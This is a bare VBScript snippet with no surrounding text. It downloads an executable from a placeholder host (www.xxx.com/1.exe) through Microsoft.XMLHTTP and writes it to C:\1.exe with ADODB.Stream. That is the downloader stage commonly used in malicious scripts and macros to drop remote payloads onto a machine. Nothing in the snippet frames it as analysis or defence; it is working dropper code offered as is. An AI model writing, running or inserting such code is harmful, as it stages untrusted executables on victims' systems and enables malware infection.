Set xPost = createObject("Microsoft.XMLHTTP")
xPost.Open "GET"," http://www.xxx.com/1.exe",0
xPost.Send()
Set sGet = createObject("ADODB.Stream")
sGet.Mode = 3
sGet.Type = 1
sGet.Open()
sGet.Write(xPost.responseBody)
sGet.SaveToFile "C:\1.exe",2